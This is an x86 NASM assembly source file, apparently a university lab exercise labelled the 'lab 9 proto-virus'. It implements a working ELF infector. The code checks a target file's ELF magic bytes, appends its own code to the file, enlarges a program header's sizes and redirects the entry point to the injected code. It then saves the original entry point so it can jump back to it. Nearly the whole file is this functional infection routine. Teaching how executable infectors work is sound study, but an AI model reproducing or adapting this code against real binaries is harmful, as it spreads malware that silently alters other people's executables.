%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

;; definitions of readelf data and useful values for the lab ;;

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_CUR 1
%define SEEK_SET 0
%define stdout 1
%define ENTRY	24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memorySize 20	
%define PHDR_filesize 16
%define	PHDR_offSet  4
%define	PHDR_virtAdress	8
%define	ELFheader_size	52
%define	load_address 0x08048000

%define EI_MAG1		1		; File identification byte 1 index 
%define ELFMAG1		'E'		; Magic number byte 1 
%define EI_MAG2		2		; File identification byte 2 index 
%define ELFMAG2		'L'		; Magic number byte 2 
%define EI_MAG3		3		; File identification byte 3 index 
%define ELFMAG3		'F'		; Magic number byte 3 
	
	global _start

	section .text

_start:     	    
    push    ebp
    mov     ebp, esp
    sub     esp, STK_RES                    ;; Set up ebp and reserve space on the stack for local storage
    call    get_my_loc                      ;; ecx --> next_i
    mov     edx, next_i                     ;; edx holds the address of next_i
    sub     edx, OutStr                     ;; edx holds the number of bytes between (••••••••next_i - OutStr)
    sub     ecx, edx                        ;; ecx now holds the address of OutStr
    write   stdout, ecx, 31                 ;; print OutStr to stdout
    open    FileName, RDWR, 0
    mov     [ebp-4], eax                    ;; [ebp-4] holds the fd
    cmp     dword [ebp-4], -1               ;; check if the fs is == 0 --> if so we opened the file correctly
    jle     ErrorOpenFile 
    mov     ebx, ebp
    sub     ebx, 8                          ;; ebx --> ebp-8
    read    [ebp-4], ebx, 4                 ;; [ebp-8] =? "ELF"

        ;; checking if its ELF file ;;

    cmp     byte [ebp-8+EI_MAG1], ELFMAG1   ;; 1st magic number ?= "E"
    jne     VirusExitNotNormally
    cmp     byte [ebp-8+EI_MAG2], ELFMAG2   ;; 2nd magic number ?= "L"
    jne     VirusExitNotNormally
    cmp     byte [ebp-8+EI_MAG3], ELFMAG3   ;; 3rd magic number ?= "F"
    jne     VirusExitNotNormally

        ;;  virus implementation on ELF file ;;

    lseek   [ebp-4], 0, SEEK_END                    ;; eax points to the end of the file (file size)
    mov     [ebp-8], eax                            ;; [ebp-8] --> file size
    write   [ebp-4], _start, virus_end - _start     ;; add _Start to the end of ELFexec
    lseek   [ebp-4], 0, SEEK_SET                    ;; bring file location back to beginning of file
    mov     ebx, ebp
    sub     ebx, 8                          
    sub     ebx, ELFheader_size                         ;; ebx = ebp-8-52
    mov     ecx, virus_end - _start                     ;; ecx holds the size of the virus 
    read    [ebp-4], ebx, ELFheader_size        ;; [ebp-60] --> ELF header beginning
    mov     esi, [ebp - 60 + ENTRY]
    mov     [ebp - 64], esi                     ;; backup previous entry point in [ebp -64]
        
        ;; gettinf the first program header ;;

    mov     eax, [ebp -60 + PHDR_start]         ;; eax points to the start of the first program header
    lseek   [ebp - 4], eax, SEEK_SET            ;; file is now points to the beginning of PHDR
    mov     edx, ebp
    sub     edx, 64
    sub     edx, PHDR_size                      ;; edx = ebp-96
    read    [ebp - 4], edx, PHDR_size           ;; edx = (ebp - 96) --> first Program Header 
    mov     ebx, [ebp - 96 + PHDR_virtAdress]   ;; ebx holds the virtual adress
    mov     [ebp - 100], ebx                    ;; save PHDR virtual adress at [ebp-100]
    
        ;; getting the second program header ;;

    mov     ebx, ebp
    sub     ebx, 132                                    ;; ebx --> ebp - 132
    read    [ebp - 4], ebx, PHDR_size                   ;; ebp - 132 --> beginning of the second program header
    ;mov     ecx, [ebp - 132 + PHDR_virtAdress]         ;; ecx holds the size of the file + virus
    ;sub     ecx, [ebp -132 +PHDR_offSet]
    mov     ecx, virus_end - _start                     ;; ecx holds the size of the virus 
    add     dword [ebp - 132 +PHDR_filesize], ecx 
    add     dword [ebp - 132 + PHDR_memorySize], ecx    ;; ecx holds the phdr memory size
    lseek   [ebp - 4], -32, SEEK_CUR                    ;; file is pointing to the beginning of the second program header
    mov     ebx, ebp
    sub     ebx, 132                                    ;; ebx = ebp -132
    write   [ebp - 4], ebx, 32                          ;; change secong program header with modifies program header
    mov     eax, [ebp - 132 + PHDR_virtAdress]          ;; edx holds the second program header virtual address
    add     eax, [ebp - 8]                              ;; eax holds the file size
    sub     eax, [ebp - 132 + PHDR_offSet]              ;; eax holds the offset of the second program header
                              
        ;; changing elf header with modified one ;;

    mov     [ebp - 60 + ENTRY], eax                     ;; entryPoint changed to the size eax holds   
    lseek   [ebp - 4], 0, SEEK_SET                      ;; bring file location back to beginning of file
    mov     ebx, ebp
    sub     ebx, 60
    write   [ebp-4], ebx, ELFheader_size                ;; replace ELF header wdith the modified ELF header
        
        ;; saving the previous enrty point at the end of the ELFexec2longile ;;

    lseek   [ebp -4], -4, SEEK_END          ;; point to the last 4 bits
    mov     ebx, ebp
    sub     ebx, 64
    write   [ebp - 4], ebx, 4               ;; save the prvioues entry point in the end of the file
    close   [ebp - 4]                       ;; close the file sved in [ebp-4]

        ErrorOpenFile:
            call    get_my_loc                      ;; ecx --> next_i
            mov     edx, next_i                     ;; edx holds the address of next_i
            sub     edx, PreviousEntryPoint         ;; edx hodls the offset between next_i - PreviousEntryPoint
            sub     ecx, edx                        ;; ecx holds the address of (next_i - (next_i - PreviousEntryPoint))
            jmp     [ecx]

VirusExitNoramlly:
       exit 0              ;; Termination if all is OK
                         
VirusExitNotNormally:
       exit 1              ;; exit if error occured
       	

FileName:	db "ELFexec2long", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0

get_my_loc:
        call next_i
next_i:
        pop ecx
        ret

PreviousEntryPoint: dd VirusExitNoramlly
virus_end: